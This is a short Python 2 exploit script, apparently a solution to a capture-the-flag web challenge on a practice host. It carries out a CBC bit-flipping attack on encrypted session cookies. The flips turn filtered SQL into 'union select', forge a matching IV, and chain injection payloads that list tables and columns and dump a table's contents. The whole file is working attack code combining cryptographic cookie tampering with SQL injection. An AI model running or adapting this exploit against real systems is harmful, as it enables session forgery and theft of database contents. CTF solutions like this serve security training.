#!/usr/bin/env python
#-*- coding: utf-8 -*-
"""
@Author : darkN0te
@Create date : 2018-07-07
@description : CBC反转
@Update date :   
"""  
from base64 import *
import urllib
import requests
import re

def denglu(payload,idx,c1,c2):
    url=r'http://ctf5.shiyanbar.com/web/jiandan/index.php'
    payload = {'id': payload}
    r = requests.post(url, data=payload)
    Set_Cookie=r.headers['Set-Cookie']
    iv=re.findall(r"iv=(.*?),", Set_Cookie)[0]
    cipher=re.findall(r"cipher=(.*)", Set_Cookie)[0]
    iv_raw = b64decode(urllib.unquote(iv))
    cipher_raw=b64decode(urllib.unquote(cipher))
    lst=list(cipher_raw)
    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))
    cipher_new=''.join(lst)
    cipher_new=urllib.quote(b64encode(cipher_new))
    cookie_new={'iv': iv,'cipher':cipher_new}
    r = requests.post(url, cookies=cookie_new)
    cont=r.content
    plain = re.findall(r"base64_decode\('(.*?)'\)", cont)[0]
    plain = b64decode(plain)
    first='a:1:{s:2:"id";s:'
    iv_new=''
    for i in range(16):
        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))
    iv_new = urllib.quote(b64encode(iv_new))
    cookie_new = {'iv': iv_new, 'cipher': cipher_new}
    r = requests.post(url, cookies=cookie_new)
    rcont = r.content
    print rcont

denglu('12',4,'2','#')
denglu('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u')
denglu('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u')
denglu("0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"+chr(0),7,'2','u')
denglu("0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);"+chr(0),6,'2','u')
